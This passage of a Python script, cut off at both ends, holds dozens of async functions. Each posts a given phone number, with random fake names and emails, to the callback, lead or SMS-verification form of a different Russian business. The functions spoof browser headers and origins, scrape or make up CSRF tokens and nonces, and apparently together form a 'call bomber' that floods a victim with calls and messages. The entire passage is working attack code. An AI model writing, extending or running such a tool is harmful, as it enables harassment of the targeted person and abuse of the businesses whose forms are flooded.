    d = {"phone":p["digits_7"],"is_ajax":"Y"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://vkusvill.ru","Referer":"https://vkusvill.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_hoff_callback(s, p):
    try:
        async with s.get("https://hoff.ru/",headers={"User-Agent":ua()},timeout=15) as resp:
            html = await resp.text(); m = re.search(r'name="csrf-token"\s+content="([^"]+)"',html)
            if not m: return 401,"CSRF not found"
            csrf = m.group(1)
    except: return 500,"fail"
    url = "https://hoff.ru/vue/auth/check_contact/"
    h = {"User-Agent":ua(),"Content-Type":"application/json","X-CSRF-TOKEN":csrf,"X-Requested-With":"XMLHttpRequest","Referer":"https://hoff.ru/","Origin":"https://hoff.ru"}
    async with s.post(url, json={"phone":p["ten_digits"]}, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_hypermarketmebel_callback(s, p):
    url = "https://hypermarketmebel.ru/api_vue/callback/"
    d = {"phone":p["digits_7"],"name":rn(),"time":"now"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","Origin":"https://hypermarketmebel.ru","Referer":"https://hypermarketmebel.ru/payment-and-delivery/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tilda_kuhni(s, p):
    url = "https://forms.tildaapi.com/procces/"
    d = {"formservices[]":"515be7c975615827d3ffddc877030765","tildaspec-formname":"Заявка","name":rn(),"phone":p["raw"],"tildaspec-formid":"form572886686","tildaspec-projectid":"7030765"}
    h = {"User-Agent":ua(),"Origin":"https://kuhni-mebelshik.ru","Referer":"https://kuhni-mebelshik.ru/spasibo"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_auchan_checkphone(s, p):
    url = "https://www.auchan.ru/v3/cmd/clientprofile/checkphone/"
    params = {"phone":p["digits_7"],"_":int(time.time()*1000)}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Referer":"https://www.auchan.ru/catalog/kuhnya/","Origin":"https://www.auchan.ru"}
    async with s.get(url, params=params, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tradedealer(s, p):
    url = "https://event.tradedealer.ru/trade_corp/send_form"
    d = {"phone":p["digits_7"],"name":rn(),"form_type":"callback","agree":"on"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://autolife76.ru","Referer":"https://autolife76.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_avr_rostov(s, p):
    url = "https://avr-rostov.ru/call_me"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://avr-rostov.ru","Referer":"https://avr-rostov.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_api_used_graphql(s, p):
    url = "https://api-used.ru/graphql"
    q = "mutation SendCallback($phone:String!,$name:String){sendCallback(phone:$phone,name:$name){success message}}"
    pl = {"query":q,"variables":{"phone":p["digits_7"],"name":rn()}}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://varshavka91.ru","Referer":"https://varshavka91.ru/thanks"}
    async with s.post(url, json=pl, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_npauto_cf7(s, p):
    url = "https://np-auto.ru/wp-json/contact-form-7/v1/contact-forms/98/feedback"; nonce = None
    try:
        async with s.get("https://np-auto.ru/",headers={"User-Agent":ua()},timeout=15) as resp:
            m = re.search(r'wpnonce"\s+value="([^"]+)"',await resp.text())
            if m: nonce = m.group(1)
    except: pass
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Заказ обратного звонка","_wpnonce":nonce or gc(),"_wp_http_referer":"/"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://np-auto.ru","Referer":"https://np-auto.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_asavtomotors(s, p):
    url = "https://asavtomotors.ru/local/components/custom/floating.button/ajax/send_to_calltouch.php"
    d = {"phone":p["digits_7"],"name":rn(),"form_id":"callback"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://asavtomotors.ru","Referer":"https://asavtomotors.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_srosl_leads(s, p):
    url = "https://office.srosl.ru/api/leads/create"
    d = {"phone":p["digits_7"],"name":rn(),"source":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","Origin":"https://vsem-podryad.ru","Referer":"https://vsem-podryad.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ecolespb_leads(s, p):
    url = "https://yaroslavl.ecolespb.ru/leads/send"
    d = {"phone":p["digits_7"],"name":rn(),"form":"callback"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","Origin":"https://yaroslavl.ecolespb.ru","Referer":"https://yaroslavl.ecolespb.ru/barber-school"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stanki_lead(s, p):
    url = "https://www.stanki.ru/ajax/"
    params = {"ACTION":"all_lead","phone":p["digits_7"],"name":rn(),"email":re_()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Referer":"https://www.stanki.ru/"}
    async with s.get(url, params=params, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_alfazdrav_calltouch(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(100000000,999999999),"siteId":31364,"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://yaroslavl.alfazdrav.ru","Referer":"https://yaroslavl.alfazdrav.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mcmedikor_form(s, p):
    url = "https://mcmedikor.ru/-/x-api/v1/public/"
    params = {"method":"form/postform","param[form_id]":"861286"}
    d = {"phone":p["digits_7"],"name":rn(),"email":re_(),"message":"Запись на прием"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://mcmedikor.ru","Referer":"https://mcmedikor.ru/"}
    async with s.post(url, params=params, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gp76_admin_ajax(s, p):
    url = "https://gp76.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://gp76.ru","Referer":"https://gp76.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_smclinic_register(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/1025/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка с сайта","requestUrl":"https://www.smclinic.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://www.smclinic.ru","Referer":"https://www.smclinic.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_smclinic_ryazan_register(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/24173/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://www.smclinic-ryazan.ru/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://www.smclinic-ryazan.ru","Referer":"https://www.smclinic-ryazan.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_medeor74_plastic_form(s, p):
    url = "https://api.medeor74.ru/bitrix/plastic-form"
    d = {"phone":p["digits_7"],"name":rn(),"email":re_(),"form_type":"consultation"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://medeor74.ru","Referer":"https://medeor74.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_medcentr56_ajaxform(s, p):
    url = "https://med-centr56.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://med-centr56.ru","Referer":"https://med-centr56.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_zdorovie33_ajaxform(s, p):
    url = "https://www.zdorovie-33.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.zdorovie-33.ru","Referer":"https://www.zdorovie-33.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_sitimed_cf7(s, p):
    url = "https://medcentr-sitimed.ru/wp-json/contact-form-7/v1/contact-forms/40598/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-email":re_(),"your-message":"Заказ обратного звонка","_wpnonce":gc()[:10]}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://medcentr-sitimed.ru","Referer":"https://medcentr-sitimed.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stiralservis_mail(s, p):
    url = "https://stiralservis.ru/wp-content/themes/default/form_constructor/mail_script.php"
    d = {"phone":p["raw"],"name":rn(),"email":re_(),"message":"Нужна консультация"}
    h = {"User-Agent":ua(),"Origin":"https://stiralservis.ru","Referer":"https://stiralservis.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_plastkom_feedback(s, p):
    url = "https://yaroslavl.plastkom.ru/feedback/send/"
    d = {"phone":p["digits_7"],"name":rn(),"email":re_(),"message":"Замер балкона"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://yaroslavl.plastkom.ru","Referer":"https://yaroslavl.plastkom.ru/balkony/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_rosstroy76_callback(s, p):
    url = "https://www.rosstroy76.ru/form/callback.php"
    d = {"phone":p["raw"],"name":rn(),"time":"Сейчас"}
    h = {"User-Agent":ua(),"Origin":"https://www.rosstroy76.ru","Referer":"https://www.rosstroy76.ru/call/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_oknatrade_callback(s, p):
    url = "https://yaroslavl.oknatrade.ru/ajax/request-call.php"
    params = {"WEB_FORM_ID":"13","phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Referer":"https://yaroslavl.oknatrade.ru/catalog/plastikovye-okna/"}
    async with s.get(url, params=params, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_shveynoe_proizvodstvo(s, p):
    url = "https://www.xn----7sbbhjyeg2agyn5k.xn--p1ai/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on","action":"callback"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.xn----7sbbhjyeg2agyn5k.xn--p1ai","Referer":"https://www.xn----7sbbhjyeg2agyn5k.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tilda_nebalkon(s, p):
    url = "https://forms.tildaapi.com/procces/"
    d = {"formservices[]":"b3a9e1dc99ed91194b1e031322df24c5","Name":rn(),"Phone":p["raw"],"Checkbox":"yes","tildaspec-formid":"form799977276","tildaspec-projectid":"10790063"}
    h = {"User-Agent":ua(),"Origin":"https://nebalkon.ru","Referer":"https://nebalkon.ru/nebalkonthanks"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_okna_olkon_send(s, p):
    url = "https://smr.okna-olkon.ru/post/send.php"
    d = {"phone":p["digits_7"],"name":rn(),"message":"Заявка на остекление"}
    h = {"User-Agent":ua(),"Origin":"https://smr.okna-olkon.ru","Referer":"https://smr.okna-olkon.ru/balkony-lodgii/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dom_nn52_mail(s, p):
    url = "https://dom-nn52.ru/wp-content/themes/paradise/mail.php"
    d = {"phone":p["raw"],"name":rn(),"email":re_(),"message":"Нужна консультация"}
    h = {"User-Agent":ua(),"Origin":"https://dom-nn52.ru","Referer":"https://dom-nn52.ru/thanksyou/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_oknaprussia39_ajax(s, p):
    url = "https://oknaprussia39.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://oknaprussia39.ru","Referer":"https://oknaprussia39.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_okna_moskva_cf7(s, p):
    url = "https://www.okna-moskva.ru/wp-json/contact-form-7/v1/contact-forms/6230/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-email":re_(),"your-message":"Заказ обратного звонка","_wpnonce":gc()[:10]}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.okna-moskva.ru","Referer":"https://www.okna-moskva.ru/osteklenie-balkonov/balkon-pod-klyuch/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_steklodom_ajax(s, p):
    url = "https://ekat.steklodom.com/local/components/std/form.result.new/templates/zakazat_zvonok/ajax/ajax.php"
    d = {"phone":p["digits_7"],"name":rn(),"form_id":"zakazat_zvonok"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://ekat.steklodom.com","Referer":"https://ekat.steklodom.com/balkony/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_planetasvet_cf7(s, p):
    url = "https://www.planetasvet.ru/wp-json/contact-form-7/v1/contact-forms/66304/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-email":re_(),"your-message":"Остекление балкона","_wpnonce":gc()[:10]}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.planetasvet.ru","Referer":"https://www.planetasvet.ru/osteklenie-balkonov/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tilda_oknawdom(s, p):
    url = "https://forms.tildaapi.com/procces/"
    d = {"formservices[]":"515be7c975615827d3ffddc877030765","Name":rn(),"Phone":p["raw"],"Checkbox":"yes","tildaspec-formid":"form572886686","tildaspec-projectid":"7030765"}
    h = {"User-Agent":ua(),"Origin":"https://oknawdom59.ru","Referer":"https://oknawdom59.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_osteclenie_balkona_ajax(s, p):
    url = "https://osteclenie-balkona.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://osteclenie-balkona.ru","Referer":"https://osteclenie-balkona.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_al_solution_ajaxform(s, p):
    url = "https://al-solution.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://al-solution.ru","Referer":"https://al-solution.ru/thanks"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_plastikovye_okna_kazan_cf7(s, p):
    url = "https://plastikovye-okna-kazan.ru/wp-json/contact-form-7/v1/contact-forms/8/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-email":re_(),"your-message":"Остекление","_wpnonce":gc()[:10]}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://plastikovye-okna-kazan.ru","Referer":"https://plastikovye-okna-kazan.ru/spasibo/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dves_zakaz(s, p):
    url = "https://dves.ru/php/zakaz.php"
    d = {"phone":p["digits_7"],"name":rn(),"email":re_(),"message":"Заявка на остекление"}
    h = {"User-Agent":ua(),"Origin":"https://dves.ru","Referer":"https://dves.ru/osteklenie-balkonov.html"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_meridian72_ajax(s, p):
    url = "https://meridian72.ru/ajax/"
    d = {"phone":p["digits_7"],"name":rn(),"action":"callback"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://meridian72.ru","Referer":"https://meridian72.ru/company/blog/balkon-lodzhiya-terrasa-v-chem-raznitsa-i-chto-luchshe/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_655_register(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/655/requests/orders/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://www.mosokna.ru/balkony-lodzhii/otdelka-balkonov-i-lodzhii","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://www.mosokna.ru","Referer":"https://www.mosokna.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_okno_moskva_ajax(s, p):
    url = "https://www.okno-moskva.ru/ajax/ajax.php"
    params = {"cmd":"send","moduleName":"Forms","ajaxForm":"1","language":"ru","sectionId":"450"}
    d = {"phone":p["digits_7"],"name":rn(),"email":re_()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.okno-moskva.ru","Referer":"https://www.okno-moskva.ru/balkony/otdelka-balkonov-i-lodzhij/"}
    async with s.post(url, params=params, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_rosstroy44_callback(s, p):
    url = "https://www.rosstroy44.ru/form/callback.php"
    d = {"phone":p["raw"],"name":rn(),"time":"Сейчас"}
    h = {"User-Agent":ua(),"Origin":"https://www.rosstroy44.ru","Referer":"https://www.rosstroy44.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_panokna_callback(s, p):
    url = "https://www.panokna.ru/js/callback.php"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Origin":"https://www.panokna.ru","Referer":"https://www.panokna.ru/stati/osteklenie_balkona_i_lodzhii_ekonomklassa/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_potolochnik24(s, p):
    url = "https://potolochnik24.ru/wp-admin/admin-ajax.php"
    d = {"action":"custom_callback","phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://potolochnik24.ru","Referer":"https://potolochnik24.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_yarmontag_collback(s, p):
    url = "https://okna.yarmontag.ru/collback.html"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Origin":"https://okna.yarmontag.ru","Referer":"https://okna.yarmontag.ru/"}
    async with s.post(url, data=d, headers=h, allow_redirects=False, timeout=15) as r: return r.status, await r.text()

async def send_potolkii_cf7(s, p):
    url = "https://potolkii.ru/wp-json/contact-form-7/v1/contact-forms/349/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":"Заявка"}
    h = {"User-Agent":ua(),"Origin":"https://potolkii.ru","Referer":"https://potolkii.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn_mail_php(s, p):
    url = "https://xn--80aezclli6gta.xn---24-5cdzfqpipcoam4bg2mvc.xn--p1ai/mail.php"
    d = {"phone":p["raw"],"name":rn(),"email":re_(),"message":"Консультация"}
    h = {"User-Agent":ua(),"Origin":"https://xn--80aezclli6gta.xn---24-5cdzfqpipcoam4bg2mvc.xn--p1ai","Referer":"https://xn--80aezclli6gta.xn---24-5cdzfqpipcoam4bg2mvc.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_natpotolok(s, p):
    url = "https://yaroslavl.natpotolok.ru/sender"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Origin":"https://yaroslavl.natpotolok.ru","Referer":"https://yaroslavl.natpotolok.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_rumexpert(s, p):
    url = "https://rumexpert.ru/form_handler.php"
    d = {"name":rn(),"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Origin":"https://rumexpert.ru","Referer":"https://rumexpert.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_korona_remont(s, p):
    url = "https://yaroslavl.korona-remont.ru/forma"
    d = {"phone":p["digits_7"],"name":rn(),"comment":"Ремонт"}
    h = {"User-Agent":ua(),"Origin":"https://yaroslavl.korona-remont.ru","Referer":"https://yaroslavl.korona-remont.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stroy_yaroslavl(s, p):
    url = "https://stroy-yaroslavl.ru/ajax/"
    token = await fetch_smart_token(s, "https://stroy-yaroslavl.ru/")
    d = {"phone":p["digits_7"],"name":rn()}
    if token: d["smart-token"] = token
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://stroy-yaroslavl.ru","Referer":"https://stroy-yaroslavl.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kronvest(s, p):
    url = "https://kronvest.net/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://kronvest.net","Referer":"https://kronvest.net/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vorota_yaroslavl(s, p):
    url = "https://vorota-yaroslavl.ru/feedback/sendFeedback"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://vorota-yaroslavl.ru","Referer":"https://vorota-yaroslavl.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_yaroslavl_zabory(s, p):
    url = "https://www.yaroslavl-zabory.ru/ajax/form_result_add.php"
    d = {"phone":p["raw"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.yaroslavl-zabory.ru","Referer":"https://www.yaroslavl-zabory.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_xn_plastic_cf7(s, p):
    url = "https://xn--80akafwalfeelcd6a8d5ch.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/4650/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"]}
    h = {"User-Agent":ua(),"Origin":"https://xn--80akafwalfeelcd6a8d5ch.xn--p1ai","Referer":"https://xn--80akafwalfeelcd6a8d5ch.xn--p1ai/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_rusklimat_sms(s, p):
    url = "https://www.rusklimat.ru/api/dev/phone/generate-code"
    d = {"phone":p["digits_7"]}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://www.rusklimat.ru","Referer":"https://www.rusklimat.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_clima_vent(s, p):
    url = "https://www.clima-vent.com/"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Origin":"https://www.clima-vent.com","Referer":"https://www.clima-vent.com/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vasko(s, p):
    url = "https://vasko.ru/local/components/vasko/callback.form/action.php"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://vasko.ru","Referer":"https://vasko.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gruzovichkof(s, p):
    url = "https://yaroslavl.gruzovichkof.ru/api/request"
    d = {"phone":p["digits_7"],"name":rn(),"comment":"Грузоперевозки"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://yaroslavl.gruzovichkof.ru","Referer":"https://yaroslavl.gruzovichkof.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_ecorex(s, p):
    url = "https://yaroslavl.ecorex.ru/local/components/mh/iblockelement.form.ajax/ajax.php"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://yaroslavl.ecorex.ru","Referer":"https://yaroslavl.ecorex.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_geradez(s, p):
    url = "https://yaroslavl.geradez.ru/page/ordercall"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Origin":"https://yaroslavl.geradez.ru","Referer":"https://yaroslavl.geradez.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dez_comfort(s, p):
    url = "https://yar.dez-comfort.ru/assets/components/ajaxform/action.php"
    fk = hashlib.md5(f"{p['digits_7']}{time.time()}".encode()).hexdigest()[:16]
    d = {"phone":p["raw"],"name":rn(),"form_key":fk,"agree":"on"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://yar.dez-comfort.ru","Referer":"https://yar.dez-comfort.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_dezservis76(s, p):
    url = "https://www.dezservis76.ru/local/templates/main/sendform.php"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Origin":"https://www.dezservis76.ru","Referer":"https://www.dezservis76.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_alfastrah(s, p):
    url = "https://www.alfastrah.ru/ajax/callback.php"
    subj = random.choice(["Автострахование","Страхование имущества","Другой вопрос"])
    d = {"name":rn(),"phone":p["formatted"],"subject":subj}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://www.alfastrah.ru","Referer":"https://www.alfastrah.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_an_ank(s, p):
    url = "http://an-ank.ru/zvonok.php"
    d = {"name":rn(),"phone":p["formatted"]}
    h = {"User-Agent":ua(),"Origin":"http://an-ank.ru","Referer":"http://an-ank.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_nzabota_callback(s, p):
    url = "https://nzabota.ru/sendCallback.php"
    d = {"name":rn(),"phone":p["formatted"],"question":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://nzabota.ru","Referer":"https://nzabota.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_teleboss_quick_call(s, p):
    url = "https://moodhood-api.teleboss.ru/v1/quick-call"
    d = {"phone":p["digits_7"],"name":rn()}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://teleboss.ru","Referer":"https://teleboss.ru/free_calling"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_neoavto_ajax(s, p):
    url = "https://neoavto.ru/wp-admin/admin-ajax.php?action=ajaxs_action&ajaxs_nonce=550570c1e5&jxs_act=ajaxs_wtw_mail_sent"
    d = {"name":rn(),"phone":p["raw"],"email":re_(),"message":"Заявка"}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://neoavto.ru","Referer":"https://neoavto.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_mopb_pposad_cf7(s, p):
    url = "https://mopb-pposad.ru/wp-json/contact-form-7/v1/contact-forms/240/feedback"
    d = {"your-name":rn(),"your-phone":p["raw"],"your-message":random.choice(MED_Q)}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://mopb-pposad.ru","Referer":"https://mopb-pposad.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_baltcourier_callback(s, p):
    url = "https://baltcourier.ru/call_me/"
    d = {"name":rn(),"phone":p["formatted"],"time":random.choice(["Сейчас","Утро","День","Вечер"])}
    h = {"User-Agent":ua(),"Content-Type":"application/x-www-form-urlencoded","Origin":"https://baltcourier.ru","Referer":"https://baltcourier.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tempo_plus_ajax(s, p):
